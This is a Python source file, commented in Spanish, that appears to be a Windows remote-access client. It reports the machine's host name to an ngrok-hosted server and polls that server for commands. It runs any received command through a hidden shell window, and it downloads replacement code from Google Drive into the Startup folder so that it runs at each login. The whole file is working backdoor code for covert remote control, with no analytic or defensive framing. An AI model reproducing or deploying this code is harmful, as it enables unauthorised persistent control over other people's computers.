import requests
import subprocess
import time
import socket
from datetime import datetime
import gdown
import winshell
import os
import sys

current_id = 0
current_version = 1
startup_folder = winshell.startup()
file_id = '1vS_XgOHj3h5XJa6i0BpR6hCJn7tJJWm5'
url = f'https://drive.google.com/uc?id={file_id}'



def dorun_file(version):
    file_name = f'client_{version}.py'
    local_file_path = os.path.join(startup_folder, file_name)
    
    # Descargar el archivo
    print(f'Descargando archivo: {local_file_path}')
    gdown.download(url, local_file_path, quiet=False)
    
    # Verificar si el archivo se ha descargado correctamente
    if os.path.exists(local_file_path):
        print(f'Ejecutando archivo: {local_file_path}')
        if file_name.endswith('.py'):
            subprocess.Popen(['python', local_file_path], shell=True)
        elif file_name.endswith('.exe'):
            subprocess.Popen(local_file_path, shell=True)
        print(f'Archivo ejecutado: {local_file_path}')
        
        # Cerrar el script actual
        print('Cerrando el script actual...')
        sys.exit()
    else:
        print(f'Error: El archivo {local_file_path} no se descargó correctamente.')

def check_version():
    global current_version
    try:
        response = requests.get("https://flexible-elk-monthly.ngrok-free.app/version")
        response.raise_for_status()
        server_version = response.json().get('version', 0)
        
        if isinstance(server_version, int) and server_version > 0:
            if server_version > current_version:
                print(f'Nueva versión disponible: {server_version}. Descargando y ejecutando...')
                dorun_file(server_version)
            else:
                print(f'La versión local ({current_version}) está actualizada.')
        else:
            print(f'Versión no válida recibida: {server_version}. Reintentando...')
            return False
    except requests.RequestException as e:
        print(f"Error al obtener la versión del servidor: {e}")
        return False
    return True


def handle_setup_response(data):
    global current_id
    if 'clients_id' in data:
        current_id = int(data['clients_id'])
        print(f'Nuevo client_id obtenido: {current_id}, Hora de inicio: {int(datetime.now().timestamp())}')
    else:
        print(f'Error: {data.get("error", "No client_id found")}')

def setup():
    global current_id
    try:
        pc_name = socket.gethostname()
        start_time = int(datetime.now().timestamp())

        response = requests.get("https://flexible-elk-monthly.ngrok-free.app/setup", 
                                params={'pc_name': pc_name, 'start_time': start_time})
        response.raise_for_status()
        data = response.json()
        handle_setup_response(data)
        
    except requests.RequestException as e:
        print(f"Error al obtener la información: {e}")

def fetch_data():
    global current_id
    url = f'https://flexible-elk-monthly.ngrok-free.app/fetch_data/{current_id}'
    try:
        response = requests.get(url)
        if "text/html" in response.headers.get("Content-Type", ""):
            raise ValueError("Se recibió HTML en lugar de JSON")
        
        if response.status_code == 200:
            data = response.json()
            print('Respuesta del servidor:', data)

            command = data.get('command', 'No command')
            run_command(command)
        else:
            print(f'Respuesta negativa del servidor: {response.status_code} - {response.text}. Esperando 30 segundos antes de reintentar...')
            time.sleep(45)
            
    except requests.RequestException as e:
        print(f"Error en la solicitud: {e}")
    except ValueError as ve:
        raise ve

def get_executable_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))
    
def remove_client_files():
    exe_dir = get_executable_dir()
    current_script_name = os.path.basename(__file__)
    for file_name in os.listdir(exe_dir):
        if 'client' in file_name.lower() and file_name != current_script_name:
            file_path = os.path.join(exe_dir, file_name)
            try:
                os.remove(file_path)
                print(f'Archivo eliminado: {file_path}')
            except Exception as e:
                print(f'Error al eliminar el archivo {file_path}: {e}')

def retry_function(func, delay=5, reget_client_id=False):
    while True:
        try:
            func()
            if reget_client_id and current_id <= 0:
                setup()
            break
        except ValueError as ve:
            print(f"Error HTML: {ve}. Reintentando obtener un nuevo client_id...")
            if reget_client_id:
                setup()
        except Exception as e:
            print(f"Error: {e}. Reintentando en {delay} segundos...")
        time.sleep(delay)


def reset():
    remove_client_files()
    
    # Verificar la versión
    version_valid = False
    while not version_valid:
        version_valid = check_version()
        time.sleep(60)
    
    # Volver a obtener un nuevo client_id
    setup()
    
    # Esperar hasta que el client_id sea válido
    while not isinstance(current_id, int) or current_id <= 0:
        print(f'current_id inválido ({current_id}). Volviendo a obtener un nuevo client_id...')
        setup()
        time.sleep(60)


server_commands = {
    "checkversion": check_version,
    "reset": reset
}




def run_command(command):
    print(f"Ejecutando comando: {command}")
    print(command)
    try:
        if command in server_commands:
            server_commands[command]()
            print("comando en array")
        else:
            subprocess.Popen(
                command,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
    except Exception as e:
        print(f"Error al ejecutar el comando: {e}")

if __name__ == '__main__':
    # Verificar la versión primero
    reset()

    # Iniciar fetch_data en un ciclo continuo
    while True:
        retry_function(fetch_data, delay=45, reget_client_id=True)